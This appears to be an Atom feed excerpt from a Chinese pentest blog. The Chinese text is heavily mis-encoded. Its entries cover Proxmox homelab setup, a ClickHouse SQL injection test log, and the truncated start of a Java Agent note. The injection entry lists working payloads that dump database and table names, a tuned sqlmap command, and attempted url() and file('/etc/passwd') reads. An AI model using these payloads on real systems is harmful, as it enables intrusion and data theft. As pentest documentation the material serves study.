&lt;p&gt;ä¿®å¤æ–¹å¼ï¼šåç«¯æ‰‹åŠ¨è°ƒç”¨ç¡®è®¤æ¥å£è¿›è¡ŒäºŒæ¬¡ç¡®è®¤&lt;a href=&quot;https://developers.google.com/android-publisher/api-ref/rest/v3/purchases.products/acknowledge&quot;&gt;acknowledge&lt;/a&gt;ï¼Œä¸€èˆ¬400å¯ä»¥è§†ä¸ºå·²ç¡®è®¤ï¼Œ409çš„æ—¶å€™éœ€è¦æŸ¥è¯¢ä¸€æ¬¡çŠ¶æ€ï¼Œå·²ç¡®è®¤çŠ¶æ€å¯ä»¥æ”¾è¡Œï¼Œå¦åˆ™æ‰å•å¤„ç†ã€‚&lt;/p&gt;
&lt;h3 id=&quot;æµ‹è¯•æ³¨æ„ç‚¹&quot;&gt;&lt;a href=&quot;#æµ‹è¯•æ³¨æ„ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•æ³¨æ„ç‚¹&quot;&gt;&lt;/a&gt;æµ‹è¯•æ³¨æ„ç‚¹&lt;/h3&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>PVEä½¿ç”¨æ³¨æ„äº‹é¡¹</title>
    <link href="https://jkme.github.io/2022/11/08/pve_homelab.html"/>
    <id>https://jkme.github.io/2022/11/08/pve_homelab.html</id>
    <published>2022-11-07T16:00:00.000Z</published>
    <updated>2022-11-25T07:43:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>ç»„å»ºçš„PVEä½¿ç”¨çš„æ˜¯è¿™ä¸ªæ–¹æ¡ˆ: <a href="https://foxi.buduanwang.vip/virtualization/1183.html/">PVE+TrueNAS+ZFS+10Gå†…ç½‘æ–¹æ¡ˆ</a></p><h2 id="è™šæ‹Ÿæœºç£ç›˜é€‰æ‹©"><a href="#è™šæ‹Ÿæœºç£ç›˜é€‰æ‹©" class="headerlink" title="è™šæ‹Ÿæœºç£ç›˜é€‰æ‹©"></a>è™šæ‹Ÿæœºç£ç›˜é€‰æ‹©</h2><p>ä½¿ç”¨çš„æ—¶å€™åˆ›å»ºçš„Windowsè™šæ‹Ÿæœºç‰¹åˆ«æ…¢ï¼Œæ‰“å¼€ç®¡ç†å™¨ä¸€çœ‹ç£ç›˜æœ€é«˜åªæœ‰5M/Sçš„å†™å…¥é€Ÿåº¦ï¼Œå‘ç°æ˜¯é€‰æ‹©çš„ç£ç›˜ç±»å‹ä¸åŒï¼Œåœ¨åˆ›å»ºè™šæ‹Ÿæœºçš„æ—¶å€™æœ€å¥½é€‰æ‹©<a href="https://foxi.buduanwang.vip/virtualization/pve/1214.html/">SCSIçš„ç£ç›˜æ ¼å¼</a></p><p>æ¯”å¦‚åœ¨æ–°å»ºWindowsè™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œä¸€èˆ¬éœ€è¦ä»¥ä¸‹<a href="https://www.dudr.top/index.php/archives/121/">æ­¥éª¤</a>ï¼š</p><ol><li>ä¸‹è½½<a href="https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/latest-virtio/virtio-win.iso">VirtIOé©±åŠ¨é•œåƒ</a></li><li>å°†é•œåƒæ–‡ä»¶ä¸Šä¼ åˆ° PVE çš„ ISOé•œåƒä¸­</li><li>æŒ‰ç…§å¸¸è§„æµç¨‹åˆ›å»ºè™šæ‹Ÿæœºï¼Œä¸å¯åŠ¨</li><li>åœ¨è™šæ‹Ÿæœºçš„ â€œç¡¬ä»¶â€ é€‰é¡¹å¡å†…æ·»åŠ  â€œCD/DVDé©±åŠ¨å™¨â€</li><li>æŒ‚è½½ win10 ç³»ç»Ÿé•œåƒå’Œ VirtIO é©±åŠ¨é•œåƒ (CD1: win10.isoï¼ŒCD2: virtio-win.iso)</li><li>æ£€æŸ¥è™šæ‹Ÿæœºçš„ â€œé€‰é¡¹â€ é€‰é¡¹å¡å†…çš„ â€œå¼•å¯¼é¡ºåº</li><li>å¯åŠ¨è™šæ‹Ÿæœº &gt; â€œåŠ è½½é©±åŠ¨ç¨‹åºâ€ &gt; â€œæµè§ˆâ€ D:\amd64\win10 &gt; â€œä¸‹ä¸€æ­¥â€ï¼Œå®‰è£…é©±åŠ¨ç¨‹åº</li><li>é©±åŠ¨å®‰è£…ååœ¨ç£ç›˜åˆ—è¡¨å°±ä¼šæ£€æµ‹åˆ°ç¡¬ç›˜ï¼Œç»§ç»­åç»­ç³»ç»Ÿå®‰è£…æ­¥éª¤</li></ol><p>ä½†æ˜¯æˆ‘ç°åœ¨å·²ç»è£…å¥½äº†è™šæ‹Ÿæœºï¼Œéœ€è¦æŠŠIDEç±»å‹çš„ç£ç›˜è½¬æ¢ä¸ºSCSIï¼š</p><ol><li>å·²æœ‰çš„è™šæ‹Ÿæœºæ’å…¥ä¸¤ä¸ªISOè®¾å¤‡ï¼Œä¸€ä¸ªæ˜¯Win10é•œåƒï¼Œä¸€ä¸ªæ˜¯Virtoé•œåƒ</li><li>å¼€æœºå¯åŠ¨è¿›å…¥Win10é•œåƒï¼Œç„¶å<code>SHIFT+F10</code>è°ƒå‡ºcmd</li><li>ç¡®å®šCç›˜çš„ç›˜ç¬¦å’ŒVirtoçš„ç›˜ç¬¦ï¼Œè¾“å…¥å‘½ä»¤<code>dism /image:C:\ /add-driver /driver:E:\vioscsi\w10\amd64</code></li><li>éšåå…³æœº: <code>wpeutil shutdown -s</code></li><li>åœ¨PVEè™šæ‹Ÿæœºç•Œé¢åˆ†ç¦»ç£ç›˜ï¼ŒæŠŠç£ç›˜ç±»å‹æ”¹ä¸ºSCSIï¼Œéšåé‡å¯å³å¯</li></ol><p><img src="/2022/11/08/pve_homelab/1.png"></p><p>æ”¹å®Œä¹‹åçš„å†™å…¥é€Ÿåº¦åœ¨40M/Sï½50M/Så·¦å³</p><h2 id="æ•°æ®çš„å¤‡ä»½å’Œå…³æœºé¡ºåº"><a href="#æ•°æ®çš„å¤‡ä»½å’Œå…³æœºé¡ºåº" class="headerlink" title="æ•°æ®çš„å¤‡ä»½å’Œå…³æœºé¡ºåº"></a>æ•°æ®çš„å¤‡ä»½å’Œå…³æœºé¡ºåº</h2><h3 id="Windowså¤‡ä»½"><a href="#Windowså¤‡ä»½" class="headerlink" title="Windowså¤‡ä»½"></a>Windowså¤‡ä»½</h3><p>å‡å¦‚éœ€è¦åœ¨Windowsé‡Œé¢å¢é‡å¤‡ä»½Aç›®å½•åˆ°å…±äº«æ–‡ä»¶å¤¹ï¼Œå¯ä»¥é€‰æ‹©æ–°å¢è®¡åˆ’ä»»åŠ¡ï¼Œæ¯5åˆ†é’Ÿå¤‡ä»½ä¸€æ¬¡ï¼š</p><ol><li>è®¡åˆ’ä»»åŠ¡: <code>robocopy C:\Users\Administrator\source\repos \\truenas\source /mir</code></li><li>ä¿®æ”¹è®¡åˆ’ä»»åŠ¡çš„è§¦å‘å™¨å’Œè¿è¡Œçš„è„šæœ¬</li></ol><h3 id="PVEå…³æœºé¡ºåº"><a href="#PVEå…³æœºé¡ºåº" class="headerlink" title="PVEå…³æœºé¡ºåº"></a>PVEå…³æœºé¡ºåº</h3><p>èƒŒæ™¯æ˜¯å¼€äº†å¥½å‡ ä¸ªè™šæ‹Ÿæœºï¼Œç„¶åç›´æ¥åœ¨PVEç³»ç»Ÿé‡Œé¢ç›´æ¥shutdownï¼Œå½“æœ‰å…¶ä»–è™šæ‹Ÿæœºè¿è¡Œçš„æ—¶å€™ï¼Œå¯èƒ½ä¼šæ•°æ®ä¸¢å¤±ã€‚æˆ‘çš„truenasè™šæ‹ŸæœºIDæ˜¯100ï¼Œæ–°å»ºä¸€ä¸ªè„šæœ¬<code>pve_shutdown</code>ï¼Œåœ¨æ¯æ¬¡å…³æœºçš„æ—¶å€™é¡ºåºå…³é—­è™šæ‹Ÿæœºï¼Œæœ€åå…³é—­truenasï¼ŒåŒæ—¶æ–°å¢ä¸€ä¸ªå¿«ç…§å¤‡ä»½:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">RUNNING_PVE</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>qm list <span class="token operator">|</span><span class="token function">grep</span> running <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span><span class="token variable">)</span></span><span class="token keyword">for</span> <span class="token for-or-select variable">pve</span> <span class="token keyword">in</span> <span class="token variable">$RUNNING_PVE</span><span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$pve</span> <span class="token operator">!=</span> <span class="token number">100</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    qm snapshot <span class="token variable">$pve</span> <span class="token string">"date-<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%Y%m%d<span class="token variable">)</span></span>"</span>    <span class="token function">rm</span> -rf /run/lock/qemu-server/lock-<span class="token variable">$pve</span>.conf    qm unlock <span class="token variable">$pve</span>    qm <span class="token function">shutdown</span> <span class="token variable">$pve</span>    <span class="token keyword">fi</span><span class="token keyword">done</span>qm snapshot <span class="token number">100</span> <span class="token string">"date-<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%Y%m%d<span class="token variable">)</span></span>"</span>qm -rf /run/lock/qemu-server/lock-100.confqm unlock <span class="token number">100</span>qm <span class="token function">shutdown</span> <span class="token number">100</span><span class="token function">shutdown</span> now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†ä¸Šé¢è„šæœ¬ä¿å­˜ä¸º<code>pve_shutdown</code>ï¼Œæ”¾åœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼Œç„¶åä½¿ç”¨å¿«æ·æŒ‡ä»¤çš„è¿è¡ŒSSHè„šæœ¬ï¼Œè¿™æ ·åœ¨æ‰‹æœºä¸Šå°±å¯ä»¥å…³æœºäº†ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç»„å»ºçš„PVEä½¿ç”¨çš„æ˜¯è¿™ä¸ªæ–¹æ¡ˆ: &lt;a href=&quot;https://foxi.buduanwang.vip/virtualization/1183.html/&quot;&gt;PVE+TrueNAS+ZFS+10Gå†…ç½‘æ–¹æ¡ˆ&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;è™šæ‹Ÿæœºç£ç›˜é€‰æ‹©&quot;&gt;&lt;a href=&quot;#è™šæ‹Ÿæœºç£ç›˜é€‰æ‹©&quot; class=&quot;headerlink&quot; title=&quot;è™šæ‹Ÿæœºç£ç›˜é€‰æ‹©&quot;&gt;&lt;/a&gt;è™šæ‹Ÿæœºç£ç›˜é€‰æ‹©&lt;/h2&gt;&lt;p&gt;ä½¿ç”¨çš„æ—¶å€™åˆ›å»ºçš„Windowsè™šæ‹Ÿæœºç‰¹åˆ«æ…¢ï¼Œæ‰“å¼€ç®¡ç†å™¨ä¸€çœ‹ç£ç›˜æœ€é«˜åªæœ‰5M/Sçš„å†™å…¥é€Ÿåº¦ï¼Œå‘ç°æ˜¯é€‰æ‹©çš„ç£ç›˜ç±»å‹ä¸åŒï¼Œåœ¨åˆ›å»ºè™šæ‹Ÿæœºçš„æ—¶å€™æœ€å¥½é€‰æ‹©&lt;a href=&quot;https://foxi.buduanwang.vip/virtualization/pve/1214.html/&quot;&gt;SCSIçš„ç£ç›˜æ ¼å¼&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚åœ¨æ–°å»ºWindowsè™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œä¸€èˆ¬éœ€è¦ä»¥ä¸‹&lt;a href=&quot;https://www.dudr.top/index.php/archives/121/&quot;&gt;æ­¥éª¤&lt;/a&gt;ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¸‹è½½&lt;a href=&quot;https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/latest-virtio/virtio-win.iso&quot;&gt;VirtIOé©±åŠ¨é•œåƒ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;å°†é•œåƒæ–‡ä»¶ä¸Šä¼ åˆ° PVE çš„ ISOé•œåƒä¸­&lt;/li&gt;
&lt;li&gt;æŒ‰ç…§å¸¸è§„æµç¨‹åˆ›å»ºè™šæ‹Ÿæœºï¼Œä¸å¯åŠ¨&lt;/li&gt;
&lt;li&gt;åœ¨è™šæ‹Ÿæœºçš„ â€œç¡¬ä»¶â€ é€‰é¡¹å¡å†…æ·»åŠ  â€œCD/DVDé©±åŠ¨å™¨â€&lt;/li&gt;
&lt;li&gt;æŒ‚è½½ win10 ç³»ç»Ÿé•œåƒå’Œ VirtIO é©±åŠ¨é•œåƒ (CD1: win10.isoï¼ŒCD2: virtio-win.iso)&lt;/li&gt;
&lt;li&gt;æ£€æŸ¥è™šæ‹Ÿæœºçš„ â€œé€‰é¡¹â€ é€‰é¡¹å¡å†…çš„ â€œå¼•å¯¼é¡ºåº&lt;/li&gt;
&lt;li&gt;å¯åŠ¨è™šæ‹Ÿæœº &amp;gt; â€œåŠ è½½é©±åŠ¨ç¨‹åºâ€ &amp;gt; â€œæµè§ˆâ€ D:\amd64\win10 &amp;gt; â€œä¸‹ä¸€æ­¥â€ï¼Œå®‰è£…é©±åŠ¨ç¨‹åº&lt;/li&gt;
&lt;li&gt;é©±åŠ¨å®‰è£…ååœ¨ç£ç›˜åˆ—è¡¨å°±ä¼šæ£€æµ‹åˆ°ç¡¬ç›˜ï¼Œç»§ç»­åç»­ç³»ç»Ÿå®‰è£…æ­¥éª¤&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä½†æ˜¯æˆ‘ç°åœ¨å·²ç»è£…å¥½äº†è™šæ‹Ÿæœºï¼Œéœ€è¦æŠŠIDEç±»å‹çš„ç£ç›˜è½¬æ¢ä¸ºSCSIï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å·²æœ‰çš„è™šæ‹Ÿæœºæ’å…¥ä¸¤ä¸ªISOè®¾å¤‡ï¼Œä¸€ä¸ªæ˜¯Win10é•œåƒï¼Œä¸€ä¸ªæ˜¯Virtoé•œåƒ&lt;/li&gt;
&lt;li&gt;å¼€æœºå¯åŠ¨è¿›å…¥Win10é•œåƒï¼Œç„¶å&lt;code&gt;SHIFT+F10&lt;/code&gt;è°ƒå‡ºcmd&lt;/li&gt;
&lt;li&gt;ç¡®å®šCç›˜çš„ç›˜ç¬¦å’ŒVirtoçš„ç›˜ç¬¦ï¼Œè¾“å…¥å‘½ä»¤&lt;code&gt;dism /image:C:\ /add-driver /driver:E:\vioscsi\w10\amd64&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;éšåå…³æœº: &lt;code&gt;wpeutil shutdown -s&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;åœ¨PVEè™šæ‹Ÿæœºç•Œé¢åˆ†ç¦»ç£ç›˜ï¼ŒæŠŠç£ç›˜ç±»å‹æ”¹ä¸ºSCSIï¼Œéšåé‡å¯å³å¯&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;/2022/11/08/pve_homelab/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;æ”¹å®Œä¹‹åçš„å†™å…¥é€Ÿåº¦åœ¨40M/Sï½50M/Så·¦å³&lt;/p&gt;
&lt;h2 id=&quot;æ•°æ®çš„å¤‡ä»½å’Œå…³æœºé¡ºåº&quot;&gt;&lt;a href=&quot;#æ•°æ®çš„å¤‡ä»½å’Œå…³æœºé¡ºåº&quot; class=&quot;headerlink&quot; title=&quot;æ•°æ®çš„å¤‡ä»½å’Œå…³æœºé¡ºåº&quot;&gt;&lt;/a&gt;æ•°æ®çš„å¤‡ä»½å’Œå…³æœºé¡ºåº&lt;/h2&gt;</summary>
    
    
    
    <category term="Fun" scheme="https://jkme.github.io/categories/Fun/"/>
    
    
  </entry>
  
  <entry>
    <title>ClickHouseæ³¨å…¥æµ‹è¯•è®°å½•</title>
    <link href="https://jkme.github.io/2022/10/27/clickhouse-sql-inject.html"/>
    <id>https://jkme.github.io/2022/10/27/clickhouse-sql-inject.html</id>
    <published>2022-10-26T16:00:00.000Z</published>
    <updated>2022-10-27T09:19:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰æœŸå°è¯•"><a href="#å‰æœŸå°è¯•" class="headerlink" title="å‰æœŸå°è¯•"></a>å‰æœŸå°è¯•</h2><p>æ ¹æ®æºä»£ç å‘ç°å¯ä»¥åˆ©ç”¨<code>&#39;)</code>æ‹¼æ¥é—­åˆSQLè¯­å¥ä¹‹åï¼Œæ’å…¥è¦æ³¨å…¥çš„Payloadï¼Œæ¯”å¦‚ï¼š<code>1&#39;)and sleep(3) and (&#39;1</code>ï¼Œå¯ä»¥ä¼‘çœ 3Sã€‚ç»è¿‡æµ‹è¯•å‘ç°å­˜åœ¨ä»¥ä¸‹é™åˆ¶ï¼š</p><ul><li>sleepçš„æ—¶é—´ä¸èƒ½è¶…è¿‡3ç§’ï¼Œè¶…è¿‡ä¹‹åé€ æˆè¯·æ±‚æŸ¥è¯¢è¶…æ—¶ï¼Œä¼šç«‹åˆ»è¿”å›</li><li>sleepå…³é”®è¯ä¸èƒ½ä½¿ç”¨å¤§å†™ï¼Œå› ä¸ºclickhouseå‡½æ•°å¤§å°å†™æ•æ„Ÿ</li><li>æ— æ³•ä½¿ç”¨sqlmapè·‘æ•°æ®ï¼Œå› ä¸ºsqlmapä¸æ”¯æŒclickhouseæ•°æ®åº“</li></ul><p>è™½ç„¶Sqlmapä¸æ”¯æŒClickHouseï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯ä¸æ­»å¿ƒçš„è·‘äº†ä¸€ä¸‹ï¼Œ<del>å¯èƒ½è¿™å°±æ˜¯è„šæœ¬å°å­å§</del></p><p>ç»è¿‡æˆ‘ä¸æ‡ˆåŠªåŠ›ï¼Œç»ˆäºè®©Sqlmapè·‘å‡ºæ¥äº†å¯æ³¨å…¥ç‚¹:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./sqlmap.py -r ~/Desktop/sql.txt -v --technique<span class="token operator">=</span>T --level <span class="token number">3</span> -v <span class="token number">3</span> --dbms MySQL --time-sec <span class="token number">3</span> --prefix <span class="token string">"')"</span> --suffix <span class="token string">"and ('"</span> --tamper lowercase --proxy http://127.0.0.1:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/27/clickhouse-sql-inject/1.png"></p><p>ä¸ºäº†è®©Sqlmapè·‘å‡ºæ¥è¿™ä¸ªæ³¨å…¥ç‚¹ï¼Œä¸€è¨€éš¾å°½ã€‚å› ä¸ºsqlmapé‡Œé¢çš„<code>SLEEP(5)</code>æ˜¯è‡ªå¸¦çš„payloadï¼Œå°±ç®—æ˜¯åŠ äº†<code>--tamper lowercase</code>ä¹Ÿä¸ä¼šæ”¹å˜è¿™ä¸ªå…³é”®payloadçš„å¤§å°å†™ï¼Œå§‹ç»ˆæ˜¯å¤§å†™ã€‚æ‰€ä»¥æˆ‘å½“æ—¶æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼š</p><ol><li>å†™ä¸ªBurpæ’ä»¶è½¬å˜æˆå°å†™â€“è´¹æ—¶è´¹åŠ›</li><li>ä¿®æ”¹Sqlmapçš„æºä»£ç â€“è¿™ä¸ªç®€å•</li></ol><p>äºæ˜¯ä¹ï¼Œæˆ‘ç›´æ¥ç¼–è¾‘sqlmapç›®å½•ä¸‹çš„<code>data/xml/payloads/time_blind.xml</code>ï¼Œç›´æ¥æŠŠ<code>SLEEP</code>æ›¿æ¢ä¸º<code>sleep</code>ï¼Œç„¶åå‘ç°ä¼šå½±å“<code>SLEEPTIME</code>è¿™ä¸ªå˜é‡ï¼Œå†æ›¿æ¢ä¸€æ¬¡<code>sleepTime</code>ä¸º<code>SLEEPTIME</code>ã€‚</p><p>è·‘å‡ºæ¥æ³¨å…¥ç‚¹æ²¡é—®é¢˜äº†ï¼Œä½†æ˜¯Sqlmapè·‘å®Œä¹‹åä¼šäºŒæ¬¡ç¡®è®¤æ˜¯å¦å¯¹åº”çš„æ•°æ®åº“ï¼Œä¼šå†å‘é€å‡ ä¸ªpayloadäºŒæ¬¡ç¡®è®¤æ•°æ®åº“çš„ç±»å‹ã€‚åˆ°æ­¤æ—¶æˆ‘å°±å‚»çœ¼äº†ï¼Œç‰¹ä¹ˆé‚£æˆ‘å‰é¢å¹²äº†å•¥(<del>ä¸æ„§æ˜¯è„šæœ¬å°å­</del>)ã€‚</p><h2 id="æ‰‹å·¥é˜¶æ®µ"><a href="#æ‰‹å·¥é˜¶æ®µ" class="headerlink" title="æ‰‹å·¥é˜¶æ®µ"></a>æ‰‹å·¥é˜¶æ®µ</h2><p>å°è¯•ä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„payloadå¯ä»¥æˆåŠŸè·å–æ•°æ®ï¼š</p><ul><li><code>&#39;) and (select currentDatabase()) and (&#39;</code></li><li><code>&#39;) and ((select * from (select arrayStringConcat(*)from system.tables )a)) and (&#39;&quot;</code></li><li><code>&quot;&#39;) and ((select * from (select arrayStringConcat(*)from system.databases )a)) and (&#39;&quot;</code></li></ul><p>ä»¥ä¸‹æ“ä½œæ˜¾ç¤ºæ— æƒé™ï¼š</p><ul><li><code>&#39;) and (select * from url(&#39;&lt;ip&gt;&#39;, CSV, &#39;column1 String, column2 UInt32&#39;)) and (&#39;</code></li><li><code>&#39;) and (select * from file(&#39;/etc/passwd&#39;, CSV, &#39;column1 String, column2 UInt32&#39;)) and (&#39;</code></li></ul><h2 id="é—ç•™é—®é¢˜"><a href="#é—ç•™é—®é¢˜" class="headerlink" title="é—ç•™é—®é¢˜"></a>é—ç•™é—®é¢˜</h2><ul><li>èƒ½å¦åˆ©ç”¨Clickhouseçš„<code>JDBC</code>è¿›è¡ŒJNDIæ³¨å…¥</li></ul><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="https://blog.deteact.com/yandex-clickhouse-injection/">Yandex.ClickHouse injection</a></li><li><a href="https://johnfrod.top/ctf/bytectf-2021double-sqli/">ByteCTF 2021 double sqli</a></li><li><a href="https://clickhouse.com/docs/zh/sql-reference/table-functions/url/">https://clickhouse.com</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰æœŸå°è¯•&quot;&gt;&lt;a href=&quot;#å‰æœŸå°è¯•&quot; class=&quot;headerlink&quot; title=&quot;å‰æœŸå°è¯•&quot;&gt;&lt;/a&gt;å‰æœŸå°è¯•&lt;/h2&gt;&lt;p&gt;æ ¹æ®æºä»£ç å‘ç°å¯ä»¥åˆ©ç”¨&lt;code&gt;&amp;#39;)&lt;/code&gt;æ‹¼æ¥é—­åˆSQLè¯­å¥ä¹‹åï¼Œæ’å…¥è¦æ³¨å…¥çš„Payloadï¼Œæ¯”å¦‚ï¼š&lt;code&gt;1&amp;#39;)and sleep(3) and (&amp;#39;1&lt;/code&gt;ï¼Œå¯ä»¥ä¼‘çœ 3Sã€‚ç»è¿‡æµ‹è¯•å‘ç°å­˜åœ¨ä»¥ä¸‹é™åˆ¶ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sleepçš„æ—¶é—´ä¸èƒ½è¶…è¿‡3ç§’ï¼Œè¶…è¿‡ä¹‹åé€ æˆè¯·æ±‚æŸ¥è¯¢è¶…æ—¶ï¼Œä¼šç«‹åˆ»è¿”å›&lt;/li&gt;
&lt;li&gt;sleepå…³é”®è¯ä¸èƒ½ä½¿ç”¨å¤§å†™ï¼Œå› ä¸ºclickhouseå‡½æ•°å¤§å°å†™æ•æ„Ÿ&lt;/li&gt;
&lt;li&gt;æ— æ³•ä½¿ç”¨sqlmapè·‘æ•°æ®ï¼Œå› ä¸ºsqlmapä¸æ”¯æŒclickhouseæ•°æ®åº“&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è™½ç„¶Sqlmapä¸æ”¯æŒClickHouseï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯ä¸æ­»å¿ƒçš„è·‘äº†ä¸€ä¸‹ï¼Œ&lt;del&gt;å¯èƒ½è¿™å°±æ˜¯è„šæœ¬å°å­å§&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;ç»è¿‡æˆ‘ä¸æ‡ˆåŠªåŠ›ï¼Œç»ˆäºè®©Sqlmapè·‘å‡ºæ¥äº†å¯æ³¨å…¥ç‚¹:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;./sqlmap.py -r ~/Desktop/sql.txt -v --technique&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;T --level &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; -v &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; --dbms MySQL --time-sec &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; --prefix &lt;span class=&quot;token string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt; --suffix &lt;span class=&quot;token string&quot;&gt;&quot;and (&#39;&quot;&lt;/span&gt; --tamper lowercase --proxy http://127.0.0.1:8080&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/2022/10/27/clickhouse-sql-inject/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¸ºäº†è®©Sqlmapè·‘å‡ºæ¥è¿™ä¸ªæ³¨å…¥ç‚¹ï¼Œä¸€è¨€éš¾å°½ã€‚å› ä¸ºsqlmapé‡Œé¢çš„&lt;code&gt;SLEEP(5)&lt;/code&gt;æ˜¯è‡ªå¸¦çš„payloadï¼Œå°±ç®—æ˜¯åŠ äº†&lt;code&gt;--tamper lowercase&lt;/code&gt;ä¹Ÿä¸ä¼šæ”¹å˜è¿™ä¸ªå…³é”®payloadçš„å¤§å°å†™ï¼Œå§‹ç»ˆæ˜¯å¤§å†™ã€‚æ‰€ä»¥æˆ‘å½“æ—¶æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å†™ä¸ªBurpæ’ä»¶è½¬å˜æˆå°å†™â€“è´¹æ—¶è´¹åŠ›&lt;/li&gt;
&lt;li&gt;ä¿®æ”¹Sqlmapçš„æºä»£ç â€“è¿™ä¸ªç®€å•&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;äºæ˜¯ä¹ï¼Œæˆ‘ç›´æ¥ç¼–è¾‘sqlmapç›®å½•ä¸‹çš„&lt;code&gt;data/xml/payloads/time_blind.xml&lt;/code&gt;ï¼Œç›´æ¥æŠŠ&lt;code&gt;SLEEP&lt;/code&gt;æ›¿æ¢ä¸º&lt;code&gt;sleep&lt;/code&gt;ï¼Œç„¶åå‘ç°ä¼šå½±å“&lt;code&gt;SLEEPTIME&lt;/code&gt;è¿™ä¸ªå˜é‡ï¼Œå†æ›¿æ¢ä¸€æ¬¡&lt;code&gt;sleepTime&lt;/code&gt;ä¸º&lt;code&gt;SLEEPTIME&lt;/code&gt;ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Javaå®‰å…¨ç¬”è®°(4)-Java Agent</title>
    <link href="https://jkme.github.io/2022/06/23/java-agent-shell.html"/>
    <id>https://jkme.github.io/2022/06/23/java-agent-shell.html</id>
    <published>2022-06-22T16:00:00.000Z</published>
    <updated>2022-11-14T01:50:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å­¦ä¹ èƒŒæ™¯"><a href="#å­¦ä¹ èƒŒæ™¯" class="headerlink" title="å­¦ä¹ èƒŒæ™¯"></a>å­¦ä¹ èƒŒæ™¯</h2><p><img src="/2022/06/23/java-agent-shell/1.png"></p><ol><li>Agentæœ¬æ¥å°±åœ¨å­¦ä¹ çš„æ¸…å•ä¸Š</li><li>æ›´æ·±å…¥ç†è§£ä¸‹è‰å¸ˆå‚…è¯´çš„ä»£ç†æ¨¡å¼</li><li>study the world</li></ol><h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><p>AOPä¸ºAspect Oriented Programmingçš„ç¼©å†™ï¼Œæ„ä¸º: é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œåœ¨è¿è¡Œæ—¶ï¼ŒåŠ¨æ€åœ°å°†ä»£ç åˆ‡å…¥åˆ°ç±»çš„æŒ‡å®šæ–¹æ³•ã€æŒ‡å®šä½ç½®ä¸Šçš„ç¼–ç¨‹æ€æƒ³å°±æ˜¯é¢å‘åˆ‡é¢çš„ç¼–ç¨‹ã€‚<br>ä»¥ä¸‹å¼•ç”¨æ¥è‡ªsu18å’Œå¤©ä¸‹å¤§æœ¨å¤´å¸ˆå‚…çš„åšå®¢ï¼š</p><blockquote><p>JDK 1.5 å¼€å§‹ï¼ŒJavaæ–°å¢äº†Instrumentation(Java Agent API)å’ŒJVMTI(JVM Tool Interface)åŠŸèƒ½ï¼Œå…è®¸JVMåœ¨åŠ è½½æŸä¸ªclassæ–‡ä»¶ä¹‹å‰å¯¹å…¶å­—èŠ‚ç è¿›è¡Œä¿®æ”¹ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒå¯¹å·²åŠ 